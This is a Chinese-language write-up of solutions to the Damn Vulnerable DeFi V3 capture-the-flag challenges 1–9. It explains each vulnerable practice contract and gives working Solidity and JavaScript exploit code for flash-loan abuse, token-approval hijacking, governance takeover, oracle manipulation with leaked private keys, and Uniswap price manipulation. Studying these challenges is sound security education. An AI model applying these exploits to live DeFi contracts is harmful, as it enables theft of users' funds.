---
slug: damn-vulnerable-defi
title: Damn-Vulnerable-Defi V3 题解
date: 2023-08-01
authors: [Zach]
math: true
categories:
  - CTF
---

## Challenge 1 - Unstoppable
[Unstoppable](https://www.damnvulnerabledefi.xyz/challenges/unstoppable/)

### 合约

- ReceiverUnstoppable：继承IERC3156FlashBorrower合约，用于发起闪电贷，执行闪电贷后的回调
- UnstoppableVault：金库合约，继承IERC3156FlashLender、ERC4626，支持闪电贷

### 脚本

- 依次部署DamnValuableToken、UnstoppableVault合约
- 存入TOKENS_IN_VAULT数量的token到金库中，转入player用户INITIAL_PLAYER_TOKEN_BALANCE数目的token
- 部署ReceiverUnstoppable合约
- 执行攻击脚本
- 期望ReceiverUnstoppable执行闪电贷的交易被revert

### 题解

攻击目标是使得通过ReceiverUnstoppable合约发起的executeFlashLoan方法被revert，首先分析executeFlashLoan的调用流程

![image](https://pic.imgdb.cn/item/654e6930c458853aef7dcc43.jpg)


重点在UnstoppableVault.flashLoan方法，分别会进行以下操作：

- 计算闪电贷开始前的余额：totalAssets()
- 计算当前的share：convertToShares(totalSupply)是否与前面计算出来的余额一致
- 计算闪电贷手续费：flashFee
- 转移amount个token到receiver，再调用receiver的onFlashLoan方法执行回调
- 从receiver方转回amount+fee数目的token
- 将fee转移给feeRecipient账户，完成本次闪电贷

若要使交易revert，关键的校验点在于使得：`convertToShares(totalSupply) != totalAssets()` 

这两个函数都是ERC4626中的定义，关于此协议可参考下面的文章：
[WTF-Solidity/51_ERC4626/readme.md at main · WTFAcademy/WTF-Solidity](https://github.com/WTFAcademy/WTF-Solidity/blob/main/51_ERC4626/readme.md)

简单来说就是ERC20的组合：资产代币asset和份额代币share，存入资产或提取资产时都会相对应的铸造或销毁对应数目的share代币

- `totalAssets()`：计算的是当前金库中的资产代币数目
- `convertToShares(totalSupply)`：totalSupply是总的share代币数目（只有deposit或mint时才会产生），convertToShares就是计算：assets * totalSupply / totalAssets()

要想使得两者不一致，只要不通过depost或mint方法向UnstoppableVault中转入token即可，因此攻击脚本内容如下：
```javascript
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const dvtForPlayer  = token.connect(player);
        await dvtForPlayer.transfer(vault.address,1);
    });
```

## Challenge 2 - Naive receiver

### 合约

- NaiveReceiverLenderPool：继承IERC3156FlashLender，提供闪电贷功能
- FlashLoanReceiver：继承IERC3156FlashBorrower，用于发起闪电贷接收回调

### 脚本

- 部署NaiveReceiverLenderPool合约，向pool中转入1000eth，pool的闪电贷手续费为1eth
- 部署FlashLoanReceiver合约，向receiver中转入10eth
- 执行攻击脚本
- 期望receiver中的余额为0，pool中的余额为1000+10eth

### 题解

攻击目标是使得receiver中的余额为空，因为每次通过pool执行闪电贷都需要1eth的手续费，因此只需通过receiver向pool执行十次闪电贷即可把10eth全部通过手续费的方式转给pool

![image](https://pic.imgdb.cn/item/654e66eec458853aef7765f2.jpg)


根据题目要求，尽量在一笔交易完成，因此可以编写合约在一笔交易中完成十次闪电贷

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../src/naive-receiver/FlashLoanReceiver.sol";
import "../../src/naive-receiver/NaiveReceiverLenderPool.sol";
import "openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker {
    constructor(address payable _pool, address payable _receiver){
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
        for(uint256 i=0; i<10; i++){
            pool.flashLoan(IERC3156FlashBorrower(_receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, "0x");
        }
    }
}
```


## Challenge 3 - Truster

[Truster](https://www.damnvulnerabledefi.xyz/challenges/truster/)


### 合约

- TrusterLenderPool：提供闪电贷功能，池子中有100w DVT tokens

### 脚本

- 部署DamnValuableToken、TrusterLenderPool合约
- 向pool中转入100w DVT tokens
- 执行攻击脚本
- 期望100w token全部归属player账户，pool余额清空

### 题解

在pool中的flashLoan方法中，首先需要计算当前的token余额balanceBefore，然后转移token到borrower，再执行给定target.functionCall，最后校验当前余额和balanceBefore

区别于之前的闪电贷，这里pool没有继承IERC3156FlashLender，而是通过调用传入的target和calldata完成回调功能

因此主要的攻击方向就是target.functionCall，包括的内容是：

- 将指定amount的token approve给攻击合约
- 执行repay流程

执行完functionCall后再利用transfer方法将token从pool中转移出来，整体流程图如下所示：
![image](https://pic.imgdb.cn/item/654e6930c458853aef7dcc43.jpg)




根据题目要求，尽可能在一笔交易完成，那么需要写合约来完成flashloan+approve+transfer的操作

- 包括两个合约：TmpAttacker和Attacker，执行flashloan的是Attacker，但是因为一笔交易内完成（只有部署合约），部署合约时无法拿到当前合约地址，需要再创建一个合约：TmpAttacker

- 部署Attacker合约时会调用pool.flashLoan，此时amount为0，只是为了进行approve，将TOKENS_IN_POOL数目的token approve给TmpAttacker

- 再调用TmpAttacker.withdraw将token转移到player账户，完成攻击

整体代码如下：

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../src/truster/TrusterLenderPool.sol";
import "../../src/DamnValuableToken.sol";

contract TmpAttacker {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    address player;
    address pool;
    DamnValuableToken token;
    constructor(address _player,address _token, address _pool){
        player = _player;
        pool = _pool;
        token = DamnValuableToken(_token);
    }

    function withdraw() external{
        token.transferFrom(pool, player, TOKENS_IN_POOL);
    }
}

contract Attacker {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address  _pool, address  _token){
        TmpAttacker attacker  = new TmpAttacker(msg.sender, _token,_pool);

        TrusterLenderPool pool = TrusterLenderPool(_pool);
        
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            TOKENS_IN_POOL
        );
        pool.flashLoan(0, address(attacker), _token, data);
        attacker.withdraw();
    }
}
```

## Challenge 4 - The Rewarder

### 合约

本题涉及的合约比较多，首先介绍ERC20Snapshot合约

**ERC20Snapshot**：继承自ERC20，通过SnapshotId可以追溯到每一个快照时间点的账户余额和总供应量，在ERC20 token的transfer之前会通过beforeTransfer来更新当前快照ID下的账号余额和总供应，通常用作分红、投票、空投等快照场景


![image](https://pic.imgdb.cn/item/654e69b5c458853aef7f3cb9.jpg)


这道题目中主要由RewardToken、AccountingToken、LiquidityToken和TheRewarderPool组成，它们的关系如下：

- TheRewarderPool对外提供deposit和withdraw方法
    - deposit：用户存入liquidityToken，mint对应份额的AccountingToken，根据当前的快照轮次mint出一定数目的rewardToken，每5天一个新的快照轮次
    - withdraw：burn对应份额的AccountingToken，将用户存入的liquidityToken转移给用户


![image](https://pic.imgdb.cn/item/654e6983c458853aef7eb11c.jpg)


除此之外，本题还提供一个闪电贷合约，可用于通过闪电贷借出liquidityToken

### 测试

- 创建alice bob charlie david四名用户，记录为users
- 部署LiquidityToken FlashLoanerPool 合约，向FlashLoanerPool中转入liquidityToken 数目为：TOKENS_IN_LENDER_POOL
- 部署 TheRewarderPool （连带部署RewardToken AccountingToken）
- 遍历users数组，向每个用户都转入一定数目的liquidityToken，并deposit到TheRewarderPool，此时轮次为1
- 将区块时间戳向后延长5天，再次遍历user数组，依次触发distributeRewards，每个用户都等分到rewardToken，此时轮次为2
- 执行攻击脚本
- 期望当前轮次为3，遍历users数组，触发distributeRewards，每个用户分到的rewardToken少于原来的1/4
    - 期望player的rewardToken余额大于0
    - 期望player的liquidityToken数目为0，FlashLoanerPool中的liquidityToken数目不变
    

### 题解

假设没有任何额外的用户操作，在下一轮次分配奖励的时候，users数组中的四位用户将会继续评分奖励，每个用户分到的rewardToken为总数的1/4

为了达到测试脚本的期望值，需要player参与rewardToken的分配，可以通过闪电贷借出liquidityToken，deposit到TheRewarderPool，此时可以触发新一轮的rewardToken分配，再通过withdraw赎回liquidityToken并返还给FlashLoanerPool

攻击合约代码如下：

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {TheRewarderPool, RewardToken} from "../../src/the-rewarder/TheRewarderPool.sol";
import "../../src/the-rewarder/FlashLoanerPool.sol";
import "../../src/DamnValuableToken.sol";

contract Attacker {
    FlashLoanerPool flashloan;
    TheRewarderPool pool;
    DamnValuableToken dvt;
    RewardToken reward;
    address internal owner;

    constructor(address _flashloan,address _pool,address _dvt,address _reward){
        flashloan = FlashLoanerPool(_flashloan);
        pool = TheRewarderPool(_pool);
        dvt = DamnValuableToken(_dvt);
        reward = RewardToken(_reward);
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        flashloan.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external{
        dvt.approve(address(pool), amount);
        // deposit liquidity token get reward token
        pool.deposit(amount);
        // withdraw liquidity token
        pool.withdraw(amount);
        // repay to flashloan
        dvt.transfer(address(flashloan), amount);
        reward.transfer(owner, reward.balanceOf(address(this)));
    }
}
```

## Challenge 5 - Side Entrance

### 合约

- SideEntranceLenderPool：提供deposit和withdraw方法，支持闪电贷

### 脚本

- 部署SideEntranceLenderPool合约
- 向pool中deposit eth数目ETHER_IN_POOL
- 执行攻击脚本
- 期望pool中的余额为0，player余额大于ETHER_IN_POOL

### 题解

本题的攻克点在于deposit+withdraw，可以先通过闪电贷获得eth，再调用deposit获得凭证，再结束闪电贷后通过withdraw提取出eth，整体流程图如下所示：

![image](https://pic.imgdb.cn/item/654e6889c458853aef7bf623.jpg)


- 调用pool的flashLoan方法时会调用`IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();`  因此在攻击合约中需要实现`execute` 方法，做的工作就是进行deposit，从而完成闪电贷还款，还多记录了一份存款凭证
- player再通过调用withdraw方法从pool中取出对应的eth，全部转移到player，完成攻击

合约代码如下：
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker {

    SideEntranceLenderPool pool;
    address owner;
    constructor(address _pool){
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }
    
    receive() external payable {
        payable(owner).transfer(msg.value);
    }

    function attack(uint256 amount) external payable{
        pool.flashLoan(amount);
    }

    function execute() external payable{
        uint256 value = msg.value;
        // deposit
        pool.deposit{value: value}();
    }

    function withdraw() external{
        pool.withdraw();
    }
}
```

## Challenge 6 - Selfie

### 合约

- SimpleGovernance：治理代币合约，实现ISimpleGovernance接口，可以预先设置action，在两天后可以执行此action
- SelfiePool：实现IERC3156FlashLender，提供闪电贷，包括ERC20Snapshot和SimpleGovernance两种token

### 测试

- 部署DamnValuableTokenSnapshot，SimpleGovernance合约
- 部署SelfiePool合约，向pool中转入token，数目为TOKENS_IN_POOL
- 对token执行一次快照，当前pool中余额和最大供闪电贷额度均为TOKENS_IN_POOL
- 执行攻击脚本
- 期望player账户token余额为TOKENS_IN_POOL，pool账户token余额为0

### 题解

本题的目的就是取走pool中的全部token，在pool合约中有`emergencyExit` 函数

可以看到，只要满足`onlyGovernance` 条件，即可转走当前合约内的任意数目token

```solidity
function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
```

`onlyGovernance` 要求调用方必须是`SimpleGovernance`合约，我们又知道在`SimpleGovernance`

合约中提供了设置action和执行action的方法，在设置action的参数中就包括了target和calldata这样的合约调用参数

因此完整的调用流程如下所示：

![image](https://pic.imgdb.cn/item/654e685ac458853aef7b6dce.jpg)


首先通过调用攻击合约，实施闪电贷获得goveranceToken，再去SimpleGoverance中记录一个action，填入的目标方法就是调用pool的emergencyExit

待两天后，通过主动执行action来转移出pool的全部token

代码如下：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {SelfiePool, SimpleGovernance, DamnValuableTokenSnapshot} from "../../src/selfie/SelfiePool.sol";
import "openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";


contract SelfiePoolAttacker is IERC3156FlashBorrower{
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    address owner;
    uint256 actionId;

    constructor(address _pool, address _governance, address _token){
        owner = msg.sender;
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack(uint256 amount) public {
        // call flashloan
        pool.flashLoan(IERC3156FlashBorrower(this), address(token), amount, "0x");
    }

    function onFlashLoan(
            address initiator,
            address _token,
            uint256 amount,
            uint256 fee,
            bytes calldata data
        ) external returns (bytes32){
            // queue action
            token.snapshot();
            actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", owner));
            token.approve(address(pool), amount);
            return keccak256("ERC3156FlashBorrower.onFlashLoan");
        }

    function executeAction() public{
        governance.executeAction(actionId);
    }

}
```

## Challenge 7 - Compromised

### 合约

- Exchange: 提供购买（mint）和售卖(burn) DamnValuableNFT的方法，对应的价格由预言机提供
- TrustfulOracle: 可信价格预言机合约，维护着由几个可信的账号设定的nft价格，对外提供查询nft价格中位数的方法
- TrustfulOracleInitializer：用于部署TrustfulOracle合约并初始化nft价格

### 测试

- 部署TrustfulOracleInitializer合约，顺带完成TrustfulOracle合约的部署，设置初始nft价格为INITIAL_NFT_PRICE
- 部署Exchange合约，顺带完成DamnValuableNFT合约的部署，存入EXCHANGE_INITIAL_ETH_BALANCE
- 执行攻击脚本
- 期望Exchange合约中的余额为0，player余额为EXCHANGE_INITIAL_ETH_BALANCE，player不拥有nft，oracle中的nft价格中位数为INITIAL_NFT_PRICE

### 题解

通过阅读Exchange合约可以发现 `buyOne` 和 `sellOne` 所需要付的和收回的eth都是由oracle提供的，通过 `oracle.getMedianPrice()` 方法获得nft的价格

攻击的目标是获取Exchange合约中的全部eth，则可以通过低买高卖nft的方式来赚取EXCHANGE_INITIAL_ETH_BALANCE数额的eth，因此最终目标来到了操纵预言机，通过分析oracle的获取nft价格中位数的方法可以得知，只需要操纵过半的预言机就可以达到修改价格的目的
```solidity
function _computeMedianPrice(string memory symbol) private view returns (uint256) {
        uint256[] memory prices = getAllPricesForSymbol(symbol);
        LibSort.insertionSort(prices);
        if (prices.length % 2 == 0) {
            uint256 leftPrice = prices[(prices.length / 2) - 1];
            uint256 rightPrice = prices[prices.length / 2];
            return (leftPrice + rightPrice) / 2;
        } else {
            return prices[prices.length / 2];
        }
    }
```
题目中给了一段捕获到的http报文信息，合理推测这两段字符串就是对应其中两个预言机的私钥，将16进制数转成ASCII码，再通过base64解码，最终得到两个私钥

完整的流程图如下所示：

![image](https://pic.imgdb.cn/item/654e661cc458853aef746b45.jpg)

首先通过操纵预言机降低nft单价让player购买，再操纵预言机将nft价格提升让player卖出即完成攻击，代码如下：
```solidity
function testExploit() public{
        /*Code solution here*/
        oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
        oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);

        postPrice(0.0001 ether);

        vm.startPrank(player);
        uint256 id = exchange.buyOne{value: 0.0001 ether}();
        vm.stopPrank();

        uint256 exchangeBalance = address(exchange).balance;
        postPrice(exchangeBalance);

        vm.startPrank(player);
        nftToken.approve(address(exchange), id);
        exchange.sellOne(id);
        vm.stopPrank();

        postPrice(INITIAL_NFT_PRICE);

        validation();
    }

function postPrice(uint256 price) public{
        vm.startPrank(oracle1);
        oracle.postPrice('DVNFT', price);
        vm.stopPrank();
        vm.startPrank(oracle2);
        oracle.postPrice('DVNFT', price);
        vm.stopPrank();
    }
```

## Challenge 8 - Puppet

### 合约

- PuppetPool：提供borrow方法，供用户使用eth购买token，token的价格来自于uniswap

### 测试

- 部署DamnValuableToken合约，部署UniswapV1Factory UniswapV1Exchange合约，完成exchange的初始化
- 部署PuppetPool合约，传入DamnValuableToken和UniswapV1Exchange合约
- 向UniswapV1Exchange中提供token与eth 1:1 的流动性
- 设置player和pool合约的token余额分别为PLAYER_INITIAL_TOKEN_BALANCE和POOL_INITIAL_TOKEN_BALANCE
- 执行测试脚本
- 期望player的nonce为1，pool中的token余额为0，player中的token余额大于POOL_INITIAL_TOKEN_BALANCE

### 题解

这道题的解题思路和上题类似，在pool提供了borrow方法中使用了uniswap作为token的价格预言机，那么我们的攻击思路就是通过操纵uniswap中token的价格以在pool中低价买入token

本题提供的是uniswap v1合约，且题目只给了合约的abi和bytecode，首先整理下uniswap v1的接口及我们需要用到的方法

```solidity
// 计算卖出token能换出多少eth
function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
// 计算买入token需要多少eth
function ethToTokenSwapOutput(uint256 tokens_bought, uint256 deadline) external returns (uint256);
```

完整的攻击流程如下图所示：

- 第一步通过调用`tokenToEthSwapInput` 以卖出手中的token获得eth，从而降低在uniswap中的token价格
- 第二步在token价格降低后，调用`lendingPool.borrow` 方法，以低价买入token
- 第三步再通过调用`ethToTokenSwapOutput` ，用手中的eth买入token来恢复uniswap中的token价格

![image](https://pic.imgdb.cn/item/654e6782c458853aef79066e.jpg)


通过将这三步在一笔交易内完成，player可以获取lendingPool中的全部token从而实现攻击目标

在具体实现时，值得注意的是**授权**步骤，因为题目要求在一笔交易内完成，但是使用uniswap又需要approve，因此涉及从player到攻击合约到uniswap的三级approve，在一笔交易内是无法实现的。

但通过看`DamnValuableToken` 的实现代码，可以看到它实现的ERC20协议中包括了拓展的`EIP- 2612 LOGIC` ，包含的就是permit逻辑，即通过用户在链下预签名，再提供到链上进行验证，从而实现了代理approve的机制，具体关于ERC-2612可以看另一篇[文章的介绍](https://www.hackdefi.xyz/erc2612/)

完整的合约代码如下：
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../src/puppet/PuppetPool.sol";
import "../../src/DamnValuableToken.sol";

contract Attacker {
    DamnValuableToken token;
    PuppetPool pool;

    receive() external payable{} // receive eth from uniswap

    constructor(uint8 v, bytes32 r, bytes32 s,
                uint256 playerAmount, uint256 poolAmount,
                address _pool, address _uniswapPair, address _token) payable{
        pool = PuppetPool(_pool);
        token = DamnValuableToken(_token);
        prepareAttack(v, r, s, playerAmount, _uniswapPair);
        // swap token for eth --> lower token price in uniswap
        _uniswapPair.call(abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)",
            playerAmount,
            1,
            type(uint256).max
        ));
        // borrow token from puppt pool
        uint256 ethValue = pool.calculateDepositRequired(poolAmount);
        pool.borrow{value: ethValue}(
            poolAmount, msg.sender
        );
        // repay tokens to uniswap --> recovery balance in uniswap
        _uniswapPair.call{value: 10 ether}(
            abi.encodeWithSignature(
                "ethToTokenSwapOutput(uint256,uint256)",
                playerAmount,
                type(uint256).max
            )
        );
        token.transfer(msg.sender, token.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function prepareAttack(uint8 v, bytes32 r, bytes32 s, uint256 amount, address _uniswapPair) internal {
        // tranfser player token to attacker contract
        token.permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v,r,s);
        token.transferFrom(msg.sender, address(this), amount);
        token.approve(_uniswapPair, amount);
    }
}
```

## Challenge 9 - Puppet V2

### 合约

- PuppetV2Pool: 提供borrow方法，用weth换出token，token价格来自于uniswap的报价
- Uniswap-v2相关合约

### 测试

- 部署weth和token合约
- 部署uniswap factory、router、pair合约
- 通过与router合约交互注入流动性，token数目：UNISWAP_INITIAL_TOKEN_RESERVE，eth数目：UNISWAP_INITIAL_WETH_RESERVE
- 部署puppetV2Pool合约，向player和pool中分别转入PLAYER_INITIAL_TOKEN_BALANCE和POOL_INITIAL_TOKEN_BALANCE数目的token
- 执行测试脚本
- 期望pool中的token余额为0，player的token余额大于POOL_INITIAL_TOKEN_BALANCE

### 题解

这道题的攻击思路和Puppet- v1的思路类似，仍然是利用uniswap价格预言机对pool进行攻击，

值得注意的是这里使用的都是uniswap-v2，在v2中使用的是token和weth的代币对，但是player用户开始只有eth，需要与weth合约进行交互

完整的攻击流程如下图所示：

- 第一步：通过调用`swapExactTokensForTokens` 将player账户中的全部token换成weth，从而降低token在uniswap中的单价
- 第二步：计算借出池子中的全部token需要花费多少weth，在经过第一步后已经拿到一部分weth，再通过质押eth补齐剩余的weth
- 第三步：调用池子的`borrow` 方法，将pool中的全部token借出
- 第四步：（本题未做要求，可以将weth放入池子中，补足池子中的差价）


![image](https://pic.imgdb.cn/item/654e67b2c458853aef7995fa.jpg)


完整的步骤代码示例如下：

```solidity
token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
address[] memory path = new address[](2);
path[0] = address(token);
path[1] = address(weth);
// swap token to weth
uniswapV2Router.swapExactTokensForTokens(
    PLAYER_INITIAL_TOKEN_BALANCE, // amount in
    1,                            // amount out min
    path,                         // path
    address(player),              // to
    block.timestamp*2             // deadline
);
uint256 value = pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
uint256 depositValue = value - weth.balanceOf(address(player));
weth.deposit{value: depositValue}();
weth.approve(address(pool), value);
pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
```